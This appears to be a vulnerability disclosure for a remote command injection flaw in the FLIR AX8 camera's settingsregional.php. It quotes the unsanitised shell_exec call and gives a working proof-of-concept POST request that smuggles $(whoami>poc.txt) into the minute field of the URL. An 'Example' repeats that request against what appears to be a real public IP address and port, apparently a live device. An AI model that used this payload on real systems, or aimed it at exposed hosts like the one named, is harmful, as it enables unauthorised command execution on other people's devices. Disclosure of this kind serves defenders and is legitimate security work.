# Remote Command Injection in parameter `$minute` in the file `settingsregional.php`

### Description

In FLIR AX8 up to 1.46.16, The  parameter **$minute** in `setDataTime` function in the file `\usr\www\application\models\settingsregional.php`  has a Remote Command Injection vulnerablilty .

`\usr\www\application\models\settingsregional.php`

```php
public function setDateTime($year, $month, $day, $hour, $minute)
{
    shell_exec(sprintf('timedatectl set-time "%s-%s-%s %s:%s"',
        $year,
        $month,
        $day,
        $hour,
        $minute
    ));
}
```

### POC

```
POST /settings/setDateTime/2025/3/15/10/11$(whoami>poc.txt) HTTP/1.1
Host: XXXXXXX
```

### Example 

```
POST /settings/setDateTime/2025/3/15/10/11$(whoami>poc.txt) HTTP/1.1
Host: 222.103.211.89:8003
```

![image-20250317212006414](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202503172120669.png)

![image-20250317212028324](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202503172120398.png)